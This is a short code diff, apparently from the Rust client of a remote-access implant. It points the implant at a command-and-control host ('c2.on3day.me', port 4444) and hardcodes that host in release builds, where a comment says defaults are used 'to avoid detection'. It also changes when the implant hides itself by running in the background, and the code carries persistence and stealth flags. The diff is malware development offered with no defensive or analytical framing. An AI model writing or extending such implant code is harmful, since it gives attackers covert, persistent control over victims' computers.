@@ -16,7 +16,7 @@ use clap::Parser;
 #[command(author, version, about, long_about = None)]
 struct Args {
     /// Server IP address
-    #[arg(short, long, default_value = "192.168.1.2")]
+    #[arg(short, long, default_value = "c2.on3day.me")]
     server: String,
     
     /// Server port
@@ -48,7 +48,14 @@ async fn main() -> Result<()> {
         Args::parse()
     } else {
         // In release mode, use default configuration to avoid detection
-        Args {server:"192.168.1.2".to_string(),port:4444,no_persistence:false,no_stealth:false,heartbeat_interval:60, reconnect_delay: 30 }
+        Args {
+            server: "c2.on3day.me".to_string(),
+            port: 4444,
+            no_persistence: false,
+            no_stealth: true, // Disable stealth in debug to see output
+            heartbeat_interval: 60,
+            reconnect_delay: 30,
+        }
     };
     
     println!("[DEBUG] Arguments parsed: {:?}", args);
@@ -77,8 +84,8 @@ async fn main() -> Result<()> {
         }
     }
     
-    // Run in background if stealth mode is enabled
-    if config.stealth_mode {
+    // Run in background if stealth mode is enabled (but not in debug builds)
+    if config.stealth_mode && !cfg!(debug_assertions) {
         println!("[DEBUG] Attempting to run in background (stealth mode)...");
         if let Err(e) = platform::run_in_background() {
             eprintln!("Failed to run in background: {}", e);
